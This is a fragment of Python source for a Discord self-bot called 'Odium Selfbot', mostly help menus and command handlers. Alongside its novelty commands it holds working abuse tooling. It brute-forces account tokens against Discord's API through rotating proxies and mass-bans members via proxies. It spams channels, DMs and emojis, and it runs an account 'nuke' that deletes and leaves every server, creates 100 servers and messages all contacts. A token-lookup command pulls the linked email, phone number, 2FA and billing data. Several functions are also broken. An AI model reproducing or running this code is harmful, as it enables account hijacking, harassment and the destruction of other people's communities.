        em.add_field(name="Registered", value=user.created_at.strftime(date_format))
        em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
        em.add_field(name="Join Number", value=str(members.index(user) + 1))
        em.add_field(name="User ID", value=str(user.id))
        if len(user.roles) > 1:
            role_string = ' '.join([r.mention for r in user.roles][1:])
            em.add_field(name="Roles [{}]".format(len(user.roles) - 1), value=role_string, inline=False)
        perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
        em.add_field(name="Permissions", value=perm_string, inline=False)
        em.set_footer(text=f"Whois {user.mention}")
        return await ctx.send(embed=em)
    else:
        date_format = "%a, %d %b %Y %I:%M %p"
        em = discord.Embed(description=user.mention)
        em.set_author(name=str(user), icon_url=user.avatar_url)
        em.set_thumbnail(url=user.avatar_url)
        em.add_field(name="Created", value=user.created_at.strftime(date_format))
        em.set_footer(text='ID: ' + str(user.id))
        return await ctx.send(embed=em)

@Odium.command()
async def main(ctx):  # b'\xfc'
    await ctx.message.delete()
    embed = discord.Embed(title="Odium Selfbot", description="Made by MajorRhine", color=0xff0000)
    embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
    embed.add_field(name=f"{prefix}geoip [ip]", value="Geolocates IP", inline=True)
    embed.add_field(name=f"{prefix}portscan [ip]", value="Port Scans IP", inline=True)
    embed.add_field(name=f"{prefix}mentionall", value="Mentions Every User In Server", inline=True)
    embed.add_field(name=f"{prefix}coinflip", value="Flips A Coin", inline=True)
    embed.add_field(name=f"{prefix}tweet [user] [text]", value="Makes A Fake Tweet", inline=True)
    embed.add_field(name=f"{prefix}embed [text]", value="Makes A Embed", inline=True)
    embed.add_field(name=f"{prefix}pfpsteal [user]", value="Steals Users Pfp", inline=True)
    embed.add_field(name=f"{prefix}roleinfo [role]", value="Shows Role Info", inline=True)
    embed.add_field(name=f"{prefix}purge [amount]", value="Clears Messages", inline=True)
    embed.add_field(name=f"{prefix}ascii [text]", value="Makes Ascii Text", inline=True)
    embed.add_field(name=f"{prefix}minesweeper", value="Minesweeper Game", inline=True)
    embed.add_field(name=f"{prefix}tinyurl [url]", value="Creates TinyURL", inline=True)
    embed.add_field(name=f"{prefix}slots", value="Play Slot Game", inline=True)
    embed.add_field(name=f"{prefix}proxyscrape", value="Scrapes Proxies", inline=True)
    embed.add_field(name=f"{prefix}btc", value="Shows Bitcoin Value", inline=True)
    embed.add_field(name=f"{prefix}doge", value="Shows DogeCoin Value", inline=True)
    embed.add_field(name=f"{prefix}pingweb [url]", value="Pings A Website", inline=True)
    embed.add_field(name=f"{prefix}copyserver", value="Copys Any Server", inline=True)
    embed.add_field(name=f"{prefix}dog", value="Shows Random Dog Pic", inline=True)
    embed.add_field(name=f"{prefix}fox", value="Shows Random Fox Pic", inline=True)
    embed.add_field(name=f"{prefix}panda", value="Shows Random Panda Pic", inline=True)
    embed.add_field(name=f"{prefix}meme", value="Shows Random Meme", inline=True)
    embed.add_field(name=f"{prefix}randomnitro", value="Creates Random Nitro Code", inline=True)
    embed.add_field(name=f"{prefix}hug [user]", value="Shows Bitcoin Value", inline=True)
    embed.add_field(name=f"{prefix}slap [user]", value="Slaps A User", inline=True)
    embed.set_footer(text="Main Commands")
    await ctx.send(embed=embed)

@Odium.command()
async def main2(ctx):  # b'\xfc'
    await ctx.message.delete()
    embed = discord.Embed(title="Odium Selfbot", description="Made by MajorRhine", color=0xff0000)
    embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
    embed.add_field(name=f"{prefix}genmc", value="Generates Minecraft Codes", inline=True)
    embed.add_field(name=f"{prefix}gensteam", value="Generates Steam Codes", inline=True)
    embed.add_field(name=f"{prefix}genpsn", value="Generates PSN Codes", inline=True)
    embed.add_field(name=f"{prefix}genxbox", value="Generates XBOX Codes", inline=True)
    embed.add_field(name=f"{prefix}genminecraft", value="Generates Minecraft Codes", inline=True)
    embed.add_field(name=f"{prefix}gennetflix", value="Generates Netflix Codes", inline=True)
    embed.add_field(name=f"{prefix}everyonespam [text]", value="Spams @everyone", inline=True)
    embed.add_field(name=f"{prefix}faketoken [user]", value="Shows Users Fake Token", inline=True)
    embed.add_field(name=f"{prefix}createpoll", value="Creates A Poll", inline=True)
    embed.add_field(name=f"{prefix}encrypt", value="Encrypts A Message", inline=True)
    embed.add_field(name=f"{prefix}decrypt", value="Decrypts A Message", inline=True)
    embed.add_field(name=f"{prefix}fuckpfp [user]", value="Fucks Profile Pic", inline=True)
    embed.add_field(name=f"{prefix}changemymind [text]", value="Shows ChangeMyMind Meme", inline=True)
    embed.add_field(name=f"{prefix}iphonex [user]", value="Shows iPhone X", inline=True)
    embed.add_field(name=f"{prefix}captcha [user]", value="Shows Captcha", inline=True)
    embed.add_field(name=f"{prefix}kannagen [text]", value="Shows Custom Text", inline=True)
    embed.add_field(name=f"{prefix}phcomment [user] [text]", value="Shows Fake PornHub Comment", inline=True)
    embed.add_field(name=f"{prefix}proxies", value="Shows Amount Of Proxies Loaded", inline=True)
    embed.set_footer(text="Main Commands (Page 2)")
    await ctx.send(embed=embed)

@Odium.command()
async def animated(ctx):  # b'\xfc'
    await ctx.message.delete()
    embed = discord.Embed(title="Odium Selfbot", description="Made by MajorRhine", color=0xff0000)
    embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
    embed.add_field(name=f"{prefix}fakevirus", value="Shows Fake Virus", inline=True)
    embed.add_field(name=f"{prefix}table", value="Shows Table", inline=True)
    embed.add_field(name=f"{prefix}boom", value="Shows Explosion", inline=True)
    embed.add_field(name=f"{prefix}hack [user]", value="Hacks User", inline=True)
    embed.add_field(name=f"{prefix}odiumslide", value="Slow Animation", inline=True)
    embed.set_footer(text="Animated Commands")
    await ctx.send(embed=embed)

@Odium.command()
async def art(ctx):  # b'\xfc'
    await ctx.message.delete()
    embed = discord.Embed(title="Odium Selfbot", description="Made by MajorRhine", color=0xff0000)
    embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
    embed.add_field(name=f"{prefix}ghost", value="Shows Ghost Ascii", inline=True)
    embed.add_field(name=f"{prefix}tree", value="Shows Tree Ascii", inline=True)
    embed.add_field(name=f"{prefix}shit", value="Shows Shit Ascii", inline=True)
    embed.add_field(name=f"{prefix}spider", value="Shows Spider Ascii", inline=True)
    embed.add_field(name=f"{prefix}odium", value="Shows Spider Ascii", inline=True)
    embed.add_field(name=f"{prefix}island", value="Shows Chocolate Ascii", inline=True)
    embed.add_field(name=f"{prefix}castle", value="Shows Chocolate Ascii", inline=True)
    embed.add_field(name=f"{prefix}truck", value="Shows Chocolate Ascii", inline=True)
    embed.add_field(name=f"{prefix}glasses", value="Shows Chocolate Ascii", inline=True)
    embed.add_field(name=f"{prefix}doggo", value="Shows Dog Ascii", inline=True)
    embed.add_field(name=f"{prefix}phone", value="Shows Phone Ascii", inline=True)
    embed.add_field(name=f"{prefix}guitar", value="Shows Guitar Ascii", inline=True)
    embed.add_field(name=f"{prefix}pistol", value="Shows Pistol Ascii", inline=True)
    embed.add_field(name=f"{prefix}tank", value="Shows Tank Ascii", inline=True)
    embed.set_footer(text="Art Commands")
    await ctx.send(embed=embed)

gen = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

@Odium.command()
async def genmc(ctx, number):
    ctx.message.delete()
    for x in range(number):
        gen1 = random.choice(gen)
        with open('/Other/generatedmc.txt', 'a') as out:
            out = open()

@Odium.command()
async def stopwebhook(ctx):
    global spammingdawebhookeroos
    try:
        await ctx.message.delete()
    except:
        pass
    spammingdawebhookeroos = False
    print(f"{Fore.RED}[-] {Fore.WHITE}Webhook Spam: Stopped")

def nooooourchannelsgotnukedomg(idofguild,nameofchan):
    try:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
        req = requests.post(f"https://canary.discord.com/api/v8/guilds/{idofguild}/channels",headers=headers,json={"type":"0","name":nameofchan})
    except:
        pass

def banl(i):
    headers = {'Authorization': token}
    r = requests.put(
        f"https://discord.com/api/v9/guilds/{guild}/bans/{i}",
        proxies={"http": 'http://' + next(proxs)},
        headers=headers
    )

    if r.status_code == 429:
        sys.stdout.write(f"\u001b[38;5;196m[MassBan]\u001b[38;5;253m => Proxy ratelimited for: {r.json()['retry_after']}\n")
        ban(i)

    elif r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
        sys.stdout.write(f'{Fore.LIGHTGREEN_EX}[Massban]\u001b[38;5;253m => Banned {i}\n')

working = '[WORK] '
err = '[ERROR] '
charslmfao = "-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
current_path = os.path.dirname(os.path.realpath(__file__))

def generator():
    for i in range (150):
        token1 = ""
        token2 = ""

        for c in range(53):
            token1 += random.choice(chars)

        token2 = 'ODU3MD'

        token1 = str(token1)
        token2 = str(token2)

        tokendone = token2 + token1
        headers = {
            'Authorization': tokendone
        }
        r = requests.get('https://discord.com/api/v6/auth/login', headers=headers)
        if r.status_code == 200:
            workingtoken = working + token
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Working Token: {workingtoken}")
            f = open(current_path + "/" + "Other/generatedtokens.txt", "a")
            f.write(workingtoken + "\n")
        else:
            print(f"{Fore.RED}[-] {Fore.WHITE}Invalid Token: {tokendone}")
    Clear()
    startprint()
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Finished! All Valid Tokens Will Save To /Other/generatedtokens.txt")

@Odium.command()
async def gentokens(ctx):
    await ctx.message.delete()
    threading.Thread(target=generator).start()
    threading.Thread(target=generator).start()
    threading.Thread(target=generator).start()

@Odium.command()
async def leavegroups(ctx):
    await ctx.message.delete()
    for channel in Odium.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()
            print(f"{Fore.RED}[-] {Fore.WHITE}Left Group: {channel}")

chars = "-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"

@Odium.command()
async def namefuck(ctx):
    await ctx.message.delete()
    try:
        name = "𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫"
        await ctx.author.edit(nick=name)
    except Exception as e:
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")

@Odium.command()
async def invisible(ctx):
    await ctx.message.delete()
    try:
        name = "‎‎‎‎‎‎‎‏‏‎ ឵឵ ឵឵ ឵឵ ឵឵‎"
        await ctx.author.edit(nick=name)
    except Exception as e:
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: {e}")

@Odium.command()
async def embed(ctx,*,text: str=None):
    await ctx.message.delete()
    embed = discord.Embed(title="Odium Selfbot", description=f"{text}", color=0xff0000)
    embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
    embed.set_footer(text="Custom Embed")
    try:
        await ctx.send(embed=embed)
    except discord.HTTPException:
        print(f"{Fore.RED}[-] {Fore.WHITE}Error: Embeds Are Turned Off")

@Odium.command()
async def channelspam(ctx, *, message):
    await ctx.message.delete()
    try:
        channels = ctx.guild.text_channels
        for channel in channels:
            await channel.send(message)
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Sent Message {message} In Channel {channel}")
    except:
        pass

@Odium.command()
async def renamechannels(ctx, *, name):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Renamed Channel {channel} To {name}")
        await channel.edit(name=name)

@Odium.command()
async def gennitro(ctx): # b'\xfc'
    await ctx.message.delete()
    count = 0
    current_path = os.path.dirname(os.path.realpath(__file__))
    url = "https://discordapp.com/api/v6/users/@me/library"
    N = input(f"{Fore.GREEN}[-] {Fore.WHITE}Amount Of Tokens To Generate: ")
    while (int(count) < int(N)):
        tokens = []
        base64_string = "=="
        while (base64_string.find("==") != -1):
            sample_string = str(random.randint(000000000000000000, 999999999999999999))
            sample_string_bytes = sample_string.encode("ascii")
            base64_bytes = base64.b64encode(sample_string_bytes)
            base64_string = base64_bytes.decode("ascii")
        else:
            token = base64_string + "." + random.choice(string.ascii_letters).upper() + ''.join(
                random.choice(string.ascii_letters + string.digits)
                for _ in range(5)) + "." + ''.join(
                random.choice(string.ascii_letters + string.digits) for _ in range(27))
            count += 1
            tokens.append(token)
        proxyfile = open('proxies.txt', r)
        proxies = proxyfile.readlines()
        proxy_pool = cycle(proxies)

        for token in tokens:
            for proxys in proxy_pool:
                proxy = next(proxy_pool)
                header = {
                    "Content-Type": "application/json",
                    "authorization": token
                }
                r = requests.get(url, headers=header, proxies={"http": proxy})
                print(token)
                if r.status_code == 200:
                    print(f"{Fore.GREEN}[-] {Fore.WHITE}Working Token Found: {token} Using Proxy: {proxys}")
                    f = open(current_path + "/" + "workingtokens.txt", "a")
                    f.write(token + "\n")
                elif "rate limited." in r.text:
                    print(f"{Fore.RED}[-] {Fore.WHITE}You Are Being Rate Limited Using Proxy: {proxys}")
                else:
                    print(f"{Fore.RED}")
            tokens.remove(token)

@Odium.command()
async def delservers(ctx): # b'\xfc'
    await ctx.message.delete()
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
    data = json.loads(resp.text)
    serversdeleted = int(0)

    for i in range(len(data)):
        servdel = requests.post(f"https://discord.com/api/v8/guilds/{data[i]['id']}/delete", headers=headers,
                                json={}).status_code
        if servdel == 204:
            serversdeleted += 1
        else:
            await asyncio.sleep(1)
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Deleted {serversdeleted} Servers")

@Odium.command()
async def leaveservers(ctx): # b'\xfc'
    await ctx.message.delete()
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
    data = json.loads(resp.text)
    serversleft = int(0)

    for i in range(len(data)):
        serverleaving = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{data[i]['id']}",headers=headers).status_code
        if serverleaving == 204:
            serversleft += 1
        else:
            await asyncio.sleep(0.1)

    print(f"{Fore.GREEN}[-] {Fore.WHITE}Left {serversleft} Servers")

def leave1():
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
    data = json.loads(resp.text)
    serversleft = int(0)

    for i in range(len(data)):
        serverleaving = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{data[i]['id']}",headers=headers).status_code
        if serverleaving == 204:
            serversleft += 1
        else:
            sleep(0.1)
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Left {serversleft} Servers")

def delete1():
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
    data = json.loads(resp.text)
    serversdeleted = int(0)

    for i in range(len(data)):
        servdel = requests.post(f"https://discord.com/api/v8/guilds/{data[i]['id']}/delete", headers=headers,
                                json={}).status_code
        if servdel == 204:
            serversdeleted += 1
        else:
            sleep(1)
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Deleted {serversdeleted} Servers")

def create1():
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
    'Content-Type': 'application/json',
    'Authorization': token,
    }
    guild = {
    'name': f"Ran-By-Odium"
    }
    for i in range(100):
     requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
     print(f"{Fore.GREEN}[-] {Fore.WHITE}Server Created: {Fore.WHITE}Ran-By-Odium")

def dm1():
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v8/users/@me/channels", headers=headers)
    data = json.loads(resp.text)
    usersmessaged = int(0)
    for i in range(len(data)):
        messagesent = requests.post(f"https://discord.com/api/v8/channels/{data[i]['id']}/messages", headers=headers,
                                    json={"content": "Account Nuked By Odium | dsc.gg/odiumsec"})
        if messagesent.status_code == 200:
            usersmessaged += 1
        else:
            sleep(0.1)
        requests.delete(f"https://discord.com/api/v8/channels/{data[i]['id']}", headers=headers)

    print(f"{Fore.GREEN}[-] {Fore.WHITE}Sent {usersmessaged} People Direct Messages")

@Odium.command()
async def odium_account(ctx): # b'\xfc'
    await ctx.message.delete()
    headers = {"authorization": token}
    resp = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=headers)
    data = json.loads(resp.text)
    serversdeleted = int(0)
    for i in range(len(data)):
        servdel = requests.post(f"https://discord.com/api/v8/guilds/{data[i]['id']}/delete", headers=headers,
                                json={}).status_code
        if servdel == 204:
            serversdeleted += 1
        else:
            await asyncio.sleep(1)
    print(f"{Fore.GREEN}[-] {Fore.WHITE}Deleted {serversdeleted} Servers")
    threading.Thread(target=leave1).start()
    threading.Thread(target=create1).start()
    threading.Thread(target=dm1).start()

@Odium.command()
async def deletewebhook(ctx,link=None):
    await ctx.message.delete()
    if link == None:
        print(f"{Fore.RED}[-] {Fore.WHITE}Missing Argument: link")
    else:
        result = requests.delete(link)
        if result.status_code == 204:
            print(f"{Fore.GREEN}[-] {Fore.WHITE}Deleted Webhook Successfully")
        else:
            print(f"{Fore.RED}[-] {Fore.WHITE}Error Deleting Webhook")

@Odium.command(aliases=['emojicreation', 'emojinuke', "emojisspam", "nukeemojis", "emojispam", "emojisnuke", "emotespam"])
async def emotenuke(ctx):
    await ctx.message.delete()
    with open("Other/odium-emoji.jpg", "rb") as f:
        img1 = f.read()

    sijome = [img1]
    for i in range(50):
        try:
            randemoj = random.choice(sijome)
            randomemojiname = "OdiumRunsYou"
            for scale in range(32):
                await ctx.guild.create_custom_emoji(name="OdiumRunsYou", image=randemoj)
        except:
            pass

@Odium.command()
async def whitelist(ctx, user: discord.Member):
    await ctx.message.delete()
    if ctx.guild.id not in Odium.whitelisted_users.keys():
        Odium.whitelisted_users[ctx.guild.id] = {}
    if user.id in Odium.whitelisted_users[ctx.guild.id]:
        print(f"{Fore.RED}[-] {Fore.WHITE}User Is Already Whitelisted")
    else:
        Odium.whitelisted_users[ctx.guild.id][user.id] = 0
        await ctx.send("Whitelisted **" + user.name.replace("*", "\*").replace("`", "\`").replace("_", "\_") + "#" +user.discriminator + "**")

@Odium.command(aliases=['wld'])
async def viewwhitelist(ctx, g=None):
    await ctx.message.delete()
    if g == '-g' or g == '-global':
        whitelist = '`All Whitelisted Users:`\n'
        for key in Odium.whitelisted_users:
            for key2 in Odium.whitelisted_users[key]:
                user = Odium.get_user(key2)
                whitelist += '**+ ' + user.name.replace('*', "\*").replace(
                    '`', "\`").replace(
                        '_', "\_"
                    ) + "#" + user.discriminator + "** - " + Odium.get_guild(
                        key).name.replace('*', "\*").replace(
                            '`', "\`").replace('_', "\_") + "" + "\n"
        await ctx.send(whitelist)
    else:
        whitelist = "`" + ctx.guild.name.replace('*', "\*").replace(
            '`', "\`").replace('_', "\_") + '\'s Whitelisted Users:`\n'
        for key in Odium.whitelisted_users:
            if key == ctx.guild.id:
                for key2 in Odium.whitelisted_users[ctx.guild.id]:
                    user = Odium.get_user(key2)
                    whitelist += '**+ ' + user.name.replace('*', "\*").replace(
                        '`', "\`").replace(
                            '_', "\_") + "#" + user.discriminator + " (" + str(
                                user.id) + ")" + "**\n"
        await ctx.send(whitelist)

@Odium.command()
async def unwhitelist(ctx, user: discord.Member):
        if ctx.guild.id not in Odium.whitelisted_users.keys():
            print(f"{Fore.RED}[-] {Fore.WHITE}User Is Not Whitelisted")
            return
        if user.id in Odium.whitelisted_users[ctx.guild.id]:
            Odium.whitelisted_users[ctx.guild.id].pop(user.id, 0)
            user2 = Odium.get_user(user.id)
            await ctx.send('Successfully unwhitelisted **' +
                           user2.name.replace('*', "\*").replace(
                               '`', "\`").replace('_', "\_") + '#' +
                           user2.discriminator + '**')

@Odium.command(aliases=["infotoken"])
async def tokeninfo(ctx, bokenxd):
    await ctx.message.delete()
    data = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': bokenxd,'Content-Type': 'application/json'})

    if data.status_code == 200:

        j = data.json()
        name = f'{j["username"]}#{j["discriminator"]}'
        userid = j['id']
        avatar = f"https://cdn.discordapp.com/avatars/{j['id']}/{j['avatar']}.webp"
        phone = j['phone']
        isverified = j['verified']
        email = j['email']
        twofa = j['mfa_enabled']
        flags = j['flags']
        creation_date = datetime.utcfromtimestamp(((int(userid) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        embed=discord.Embed(title=f"Odium Selfbot", description=f"Made by MajorRhine\nUser : `{name}`\nUser-id : `{userid}`\nAvatar url : `{avatar}`\nPhone number linked : `{phone}`\nEmail verification status : `{isverified}`\nEmail linked : `{email}`\n2f/a Status : `{twofa}`\nFlags : `{flags}`", color=0xff0000)
        embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
        embed.set_footer(text="Token Info")
        message = await ctx.send(embed=embed)

        has_nitro = False
        datahmm = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers={'Authorization': bokenxd,'Content-Type': 'application/json'})
        nitro_data = datahmm.json()
        nitroyems = bool(len(nitro_data) > 0)
        if nitroyems:
            end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            totalnitro = abs((start - end).days)
            embed=discord.Embed(title=f"Odium Selfbot", description=f"Made by MajorRhine\nUser : `{name}`\nUser-id : `{userid}`\nAvatar url : `{avatar}`\nPhone number linked : `{phone}`\nEmail verification status : `{isverified}`\nEmail linked : `{email}`\n2f/a Status : `{twofa}`\nFlags : `{flags}`\n\nNitro Data:\nHad nitro since : `{end}`\nNitro ends on : `{start}`\nTotal nitro : `{totalnitro}`", color=0xff0000)
            embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
            embed.set_footer(text="Token Info")
            await message.edit(embed=embed)
    else:
        embed=discord.Embed(title=f"Odium Selfbot", description=f"Site responded with status code : `{data.status_code}`\nMessage : `{data.text}`", color=0xff0000)
        embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
        embed.set_footer(text="Token Info")
        await ctx.send(embed=embed)

@Odium.command(aliases=["encode","base64","base64encode","encodebase64"])
async def encrypt(ctx,*,message):
    msg = base64.b64encode(str(message).encode())
    final = str(msg).replace("'","")
    await ctx.message.edit(content=f"`{final[1:]}`")

@Odium.command(aliases=["decode","base64decode","decodebase64"])
async def decrypt(ctx,*,message):
    msg = base64.b64decode(str(message).encode())
    final = str(msg).replace("'","")
    await ctx.message.edit(content=f"`{final[1:]}`")

@Odium.command()
async def createpoll(ctx, *, message):
    await ctx.message.delete()
    try:
        embed = discord.Embed(title=f"Odium Selfbot", description=f"`{message}`",color=0xff0000)
        embed.set_image(url="https://cdn.discordapp.com/attachments/535148317123018753/855525877240037376/2.gif")
        embed.set_footer(text="Odium Poll")
        a = await ctx.send(embed=embed)
    except:
        a = await ctx.send(message)

    await a.add_reaction("👍")
    await a.add_reaction("👎")

@Odium.command()
async def delallfriends(ctx):
    for user in Odium.user.friends:
        await user.remove_friend()
        print(f"{Fore.RED}[-] {Fore.WHITE}Deleted Friend: {user.name}")

def httpproxy():
    file2 = open("Scraped Proxies\http-proxies.txt", "r+")
    file2.truncate(0)
    file2.close()
    file = open("Scraped Proxies\http-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Scraped HTTP Proxy: {p}")

def httpsproxy():
    file2 = open("Scraped Proxies\https-proxies.txt", "r+")
    file2.truncate(0)
    file2.close()
    file = open("Scraped Proxies\https-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
             proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Scraped HTTPS Proxy: {p}")

def socks4proxy():
    file2 = open("Scraped Proxies\socks4-proxies.txt", "r+")
    file2.truncate(0)
    file2.close()
    file = open("Scraped Proxies\socks4-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Scraped Socks4 Proxy: {p}")

def socks5proxy():
    file2 = open("Scraped Proxies\socks5-proxies.txt", "r+")
    file2.truncate(0)
    file2.close()
    file = open("Scraped Proxies\socks5-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
        print(f"{Fore.GREEN}[-] {Fore.WHITE}Scraped Socks5 Proxy: {p}")

@Odium.command()
async def proxyscrape(ctx): # b'\xfc'
    await ctx.message.delete()
    threading.Thread(target=httpproxy).start()
    threading.Thread(target=httpsproxy).start()
    threading.Thread(target=socks4proxy).start()
    threading.Thread(target=socks5proxy).start()

@Odium.command()
async def table(ctx):
    list = (
        "`(\°-°)\  ┬─┬`",
        "`(\°□°)\  ┬─┬`",
        "`(-°□°)-  ┬─┬`",
        "`(╯°□°)╯    ]`",
        "`(╯°□°)╯     ┻━┻`",
         "`(╯°□°)╯       [`",
        "`(╯°□°)╯          ┬─┬`",
        "`(╯°□°)╯                 ]`",
        "`(╯°□°)╯                  ┻━┻`",
        "`(╯°□°)╯                         [`",
        "`(\°-°)\                               ┬─┬`",
    )
    for i in list:
        await asyncio.sleep(1.5)
        await ctx.message.edit(content=i)

@Odium.command()
async def anim(ctx):
    list = (
        "```      ·▄▄▄▄  ▪  ▄• ▄▌• ▌ ▄ ·.     .▄▄ · ▄▄▄ . ▄▄· ▄• ▄▌▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌```",
        "```      ·▄▄▄▄  ▪  ▄• ▄▌• ▌ ▄ ·.     .▄▄ · ▄▄▄ . ▄▄· ▄• ▄▌▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌\n▪     ██▪ ██ ██ █▪██▌·██ ▐███▪    ▐█ ▀. ▀▄.▀·▐█ ▌▪█▪██▌▀▄ █·██ •██  ▐█▪██▌```",
        "```      ·▄▄▄▄  ▪  ▄• ▄▌• ▌ ▄ ·.     .▄▄ · ▄▄▄ . ▄▄· ▄• ▄▌▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌\n▪     ██▪ ██ ██ █▪██▌·██ ▐███▪    ▐█ ▀. ▀▄.▀·▐█ ▌▪█▪██▌▀▄ █·██ •██  ▐█▪██▌\n ▄█▀▄ ▐█· ▐█▌▐█·█▌▐█▌▐█ ▌▐▌▐█·    ▄▀▀▀█▄▐▀▀▪▄██ ▄▄█▌▐█▌▐▀▀▄ ▐█· ▐█.▪▐█▌▐█▪```",
        "```      ·▄▄▄▄  ▪  ▄• ▄▌• ▌ ▄ ·.     .▄▄ · ▄▄▄ . ▄▄· ▄• ▄▌▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌\n▪     ██▪ ██ ██ █▪██▌·██ ▐███▪    ▐█ ▀. ▀▄.▀·▐█ ▌▪█▪██▌▀▄ █·██ •██  ▐█▪██▌\n ▄█▀▄ ▐█· ▐█▌▐█·█▌▐█▌▐█ ▌▐▌▐█·    ▄▀▀▀█▄▐▀▀▪▄██ ▄▄█▌▐█▌▐▀▀▄ ▐█· ▐█.▪▐█▌▐█▪\n▐█▌.▐▌██. ██ ▐█▌▐█▄█▌██ ██▌▐█▌    ▐█▄▪▐█▐█▄▄▌▐███▌▐█▄█▌▐█•█▌▐█▌ ▐█▌· ▐█▀·.```",
        "```      ·▄▄▄▄  ▪  ▄• ▄▌• ▌ ▄ ·.     .▄▄ · ▄▄▄ . ▄▄· ▄• ▄▌▄▄▄  ▪  ▄▄▄▄▄ ▄· ▄▌\n▪     ██▪ ██ ██ █▪██▌·██ ▐███▪    ▐█ ▀. ▀▄.▀·▐█ ▌▪█▪██▌▀▄ █·██ •██  ▐█▪██▌\n ▄█▀▄ ▐█· ▐█▌▐█·█▌▐█▌▐█ ▌▐▌▐█·    ▄▀▀▀█▄▐▀▀▪▄██ ▄▄█▌▐█▌▐▀▀▄ ▐█· ▐█.▪▐█▌▐█▪\n▐█▌.▐▌██. ██ ▐█▌▐█▄█▌██ ██▌▐█▌    ▐█▄▪▐█▐█▄▄▌▐███▌▐█▄█▌▐█•█▌▐█▌ ▐█▌· ▐█▀·.\n ▀█▄▀▪▀▀▀▀▀• ▀▀▀ ▀▀▀ ▀▀  █▪▀▀▀     ▀▀▀▀  ▀▀▀ ·▀▀▀  ▀▀▀ .▀  ▀▀▀▀ ▀▀▀   ▀ • ```",
